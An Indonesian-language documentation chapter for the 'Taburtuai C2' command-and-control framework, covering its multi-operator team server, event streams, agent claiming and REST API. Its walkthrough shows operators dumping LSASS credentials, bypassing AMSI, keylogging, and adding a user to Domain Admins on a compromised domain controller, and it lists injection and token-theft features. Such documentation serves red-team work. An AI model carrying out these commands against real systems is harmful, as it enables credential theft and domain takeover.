# 20 — Multi-Operator Team Server

> Lebih dari satu operator bisa terhubung ke C2 server secara bersamaan,
> melihat aktivitas real-time, dan mengkoordinasikan aksi tanpa saling mengganggu.

---

## Arsitektur Team Server

```
┌─────────────────────────────────────────────────────────────────────┐
│                          C2 SERVER                                  │
│                                                                     │
│   ┌─────────────────────────────────────────────────────────────┐   │
│   │                        TeamHub                              │   │
│   │                                                             │   │
│   │  operators:                   claims:                      │   │
│   │    "alice-abc" → Alice        "agent-123" → "alice-abc"    │   │
│   │    "bob-xyz"   → Bob          "agent-456" → "bob-xyz"      │   │
│   │                               "agent-789" → (unclaimed)    │   │
│   │                                                             │   │
│   │  event channel: chan TeamEvent (buffered 64)                │   │
│   └─────────────────────────────────────────────────────────────┘   │
│          │                  │                   │                   │
│          │ fan-out SSE      │                   │                   │
│          ▼                  ▼                   ▼                   │
│   [Alice's session]  [Bob's session]   [Charlie's session]          │
│    (SSE stream)       (SSE stream)      (SSE stream)                │
└─────────────────────────────────────────────────────────────────────┘
          │                  │                   │
          ▼                  ▼                   ▼
    Alice's terminal   Bob's terminal    Charlie's terminal
```

---

## Fitur Team Server

| Fitur | Deskripsi |
|-------|-----------|
| Operator registration | Setiap operator dapat session ID unik |
| Real-time SSE stream | Semua event dikirim ke semua operator secara realtime |
| Agent claiming | Satu operator bisa "klaim" agent (exclusive write lock) |
| CanWrite enforcement | Operator lain tidak bisa kirim command ke agent yang diklaim |
| Event broadcast | Operator bisa broadcast pesan ke semua operator |
| Auto-cleanup | Operator disconnect → claim-nya dilepas otomatis |

---

## Cara Kerja CanWrite

```
Request: POST /api/v1/command/execute
Header : X-Session-ID: alice-abc

Server logic:
  agentID = "9c821d77"
  sessionID = "alice-abc"

  TeamHub.CanWrite("9c821d77", "alice-abc"):
    claims["9c821d77"] = ?
    
    → "" (unclaimed) → return TRUE → lanjutkan
    → "alice-abc"    → return TRUE → lanjutkan (same operator)
    → "bob-xyz"      → return FALSE → 409 Conflict!
```

---

## Event Types yang Di-Broadcast

| Event Type | Kapan Terjadi | Payload |
|------------|---------------|---------|
| `agent_checkin` | Agent baru beacon/register | hostname, IP |
| `result_ready` | Perintah selesai dieksekusi | cmd type, status, duration |
| `operator_message` | Broadcast manual dari operator | pesan custom |

---

## Langkah 1: Daftar Operator dan Subscribe Event Stream

Setiap operator membuka terminal dan subscribe ke event stream:

### Terminal Alice

```bash
./bin/operator team subscribe \
  --name "Alice" \
  --server https://c2.corp.local:8000
```

**Output Alice:**
```
[*] Registering operator Alice...
[+] Session ID: alice-8f3a2b1c-d4e5-6789-abcd-ef0123456789
[*] Subscribing to event stream...
[+] Connected. Listening for events...

[09:00:01] SYSTEM: Alice joined (2 operators online)
```

### Terminal Bob

```bash
./bin/operator team subscribe \
  --name "Bob" \
  --server https://c2.corp.local:8000
```

**Output Bob:**
```
[+] Session ID: bob-2c4d6e8f-0a1b-2345-cdef-012345678901
[+] Connected.

[09:01:15] SYSTEM: Bob joined (2 operators online)
```

**Alice melihat di streamnya:**
```
[09:01:15] SYSTEM: Bob joined (2 operators online)
```

---

## Langkah 2: Lihat Semua Operator

```bash
./bin/operator team operators --server https://c2.corp.local:8000
```

**Output:**
```
[+] Connected operators (2):

SESSION ID              NAME    JOINED          AGENTS CLAIMED
----------------------  ------  --------------  --------------
alice-8f3a2b1c-...      Alice   09:00:01        0
bob-2c4d6e8f-...        Bob     09:01:15        0
```

---

## Langkah 3: Real-Time Event Stream

Setelah agent connect, semua operator melihat event:

**Event yang muncul di stream Alice DAN Bob:**
```
[09:05:01] AGENT_CHECKIN  agent=2703886d  host=DESKTOP-QLPBF95  ip=192.168.1.105  user=john.doe
[09:07:12] AGENT_CHECKIN  agent=9c821d77  host=DC01             ip=192.168.1.100  user=NT AUTHORITY\SYSTEM
[09:12:45] RESULT_READY   agent=2703886d  cmd=execute  status=completed  duration=1.3s
[09:15:00] RESULT_READY   agent=9c821d77  cmd=inject_remote  status=completed  duration=0.8s
```

---

## Langkah 4: Claim Agent (Exclusive Write Lock)

Alice mengklaim DC01 agar Bob tidak bisa mengirim command ke sana secara tidak sengaja:

### Alice Claim DC01

```bash
./bin/operator team claim 9c821d77 \
  --session alice-8f3a2b1c-d4e5-6789-abcd-ef0123456789 \
  --server https://c2.corp.local:8000
```

**Output Alice:**
```
[+] Agent 9c821d77 (DC01) claimed successfully.
[i] Operator lain tidak bisa mengirim command ke agent ini.
[i] Release dengan: team release 9c821d77 --session alice-...
```

**Event yang muncul di stream Bob:**
```
[09:20:00] AGENT_CLAIMED  agent=9c821d77  host=DC01  claimed_by=Alice
```

### Bob Claim Workstation

```bash
./bin/operator team claim 2703886d \
  --session bob-2c4d6e8f-0a1b-2345-cdef-012345678901 \
  --server https://c2.corp.local:8000
```

**Output Bob:**
```
[+] Agent 2703886d (DESKTOP-QLPBF95) claimed by Bob.
```

---

## Langkah 5: Enforcement — Command Ditolak kalau Tidak Punya Claim

Bob mencoba kirim command ke DC01 yang diklaim Alice:

```bash
./bin/operator cmd 9c821d77 "whoami" --server https://c2.corp.local:8000
```

**Output Bob:**
```
[!] 409 Conflict: agent 9c821d7 is claimed by Alice — release it first or use their session
```

Semua endpoint berikut di-enforce dengan cek ini:
- `cmd` (execute)
- `inject` (remote/self/ppid)
- `hollow`, `hijack`, `stomp`, `mapinject`
- `bypass` (amsi/etw)
- `token` (steal/make/revert/runas)
- `creds` (lsass/sam/browser/clipboard)
- `keylog`, `screenshot`
- `netscan`, `arpscan`, `socks5`
- `registry` (read/write/delete/list)
- `bof`, `opsec`, `lolbin`, `ads`
- `persistence`, `process`

---

## Langkah 6: Cek Status Claim Agent

```bash
./bin/operator team claim 9c821d77 --status \
  --server https://c2.corp.local:8000
```

**Output:**
```
[+] Claim status for agent 9c821d77 (DC01):

    Claimed : YES
    By      : Alice (alice-8f3a2b1c-...)
    Since   : 09:20:00 (15 minutes ago)
```

**Kalau tidak diklaim:**
```
[+] Claim status for agent 7f2a3b4c:
    Claimed : NO (available to all operators)
```

---

## Langkah 7: Release Agent

Alice selesai dengan DC01 dan release:

```bash
./bin/operator team release 9c821d77 \
  --session alice-8f3a2b1c-d4e5-6789-abcd-ef0123456789 \
  --server https://c2.corp.local:8000
```

**Output Alice:**
```
[+] Agent 9c821d77 released.
[i] Agent sekarang bisa diakses oleh semua operator.
```

**Event di stream semua operator:**
```
[09:35:00] AGENT_RELEASED  agent=9c821d77  host=DC01  released_by=Alice
```

---

## Langkah 8: Broadcast Pesan ke Semua Operator

```bash
./bin/operator team broadcast \
  --message "Alice: DC01 domain dump selesai. Pindah ke FileServer-01." \
  --server https://c2.corp.local:8000
```

**Event yang muncul di SEMUA operator:**
```
[09:35:15] BROADCAST  Alice: DC01 domain dump selesai. Pindah ke FileServer-01.
```

---

## Skenario Tim Lengkap

```bash
# ── Setup (semua operator subscribe dulu) ─────────────────
# Terminal Alice:
./bin/operator team subscribe --name Alice --server https://c2.corp.local:8000
# Session: alice-abc...

# Terminal Bob:
./bin/operator team subscribe --name Bob --server https://c2.corp.local:8000
# Session: bob-xyz...

# ── Lihat operator aktif ──────────────────────────────────
./bin/operator team operators --server https://c2.corp.local:8000
# alice-abc  Alice  2 agents claimed: 0
# bob-xyz    Bob    0 agents claimed: 0

# ── Alice handle DC, Bob handle workstation ───────────────
# Alice:
./bin/operator team claim 9c821d77 --session alice-abc --server ...
./bin/operator cmd 9c821d77 "whoami" --server ... --wait
./bin/operator creds lsass 9c821d77 --server ... --wait

# Bob (parallel):
./bin/operator team claim 2703886d --session bob-xyz --server ...
./bin/operator bypass amsi 2703886d --server ... --wait
./bin/operator screenshot 2703886d --server ... --wait
./bin/operator keylog start 2703886d --duration 300 --server ... --wait

# ── Koordinasi via broadcast ──────────────────────────────
./bin/operator team broadcast \
  --message "Alice: LSASS dump selesai. Upload ke /loot/dc01_lsass.dmp" \
  --server ...

# ── Alice selesai, release DC ─────────────────────────────
./bin/operator team release 9c821d77 --session alice-abc --server ...

# ── Bob ambil DC (karena sudah direlease) ─────────────────
./bin/operator team claim 9c821d77 --session bob-xyz --server ...
./bin/operator cmd 9c821d77 "net group 'Domain Admins' /add bob /domain" --server ... --wait
```

---

## API Reference (untuk Custom Integration)

Semua endpoint team server dapat diakses langsung via REST API:

```bash
# Register operator
curl -X POST https://c2.corp.local:8000/api/v1/team/register \
  -H "Content-Type: application/json" \
  -d '{"name": "Alice"}'
# {"success":true,"data":{"session_id":"alice-abc...","name":"Alice"}}

# List operators
curl https://c2.corp.local:8000/api/v1/team/operators

# Claim agent
curl -X POST https://c2.corp.local:8000/api/v1/team/agent/9c821d77/claim \
  -H "X-Session-ID: alice-abc..."

# Release agent
curl -X POST https://c2.corp.local:8000/api/v1/team/agent/9c821d77/release \
  -H "X-Session-ID: alice-abc..."

# Cek status claim
curl https://c2.corp.local:8000/api/v1/team/agent/9c821d77/claim

# Broadcast event
curl -X POST https://c2.corp.local:8000/api/v1/team/broadcast \
  -H "Content-Type: application/json" \
  -d '{"message": "Phase 1 complete"}'

# Subscribe SSE stream (streaming, tidak pernah selesai sampai disconnect)
curl -N https://c2.corp.local:8000/api/v1/team/events?name=Alice
# data: {"type":"system","payload":"Alice joined","time":"..."}
# data: {"type":"agent_checkin","agent_id":"...","payload":"DC01 checked in","time":"..."}
```

---

## Troubleshooting Team Server

| Masalah | Penyebab | Solusi |
|---------|----------|--------|
| `409 Conflict` saat kirim command | Agent diklaim operator lain | `team operators` untuk lihat siapa, minta release |
| SSE stream disconnect setiap 30 detik | Proxy/load balancer timeout | Konfigurasi proxy idle timeout >120s |
| Operator lain tidak terlihat di `team operators` | Belum subscribe | Jalankan `team subscribe` dulu |
| Release gagal dengan 403 | Session ID salah atau operator lain yang claim | Hanya operator yang claim bisa release (atau admin) |

---

**Selesai.** Semua fitur Taburtuai C2 telah terdokumentasi. Kembali ke [README](README.md) untuk indeks lengkap.
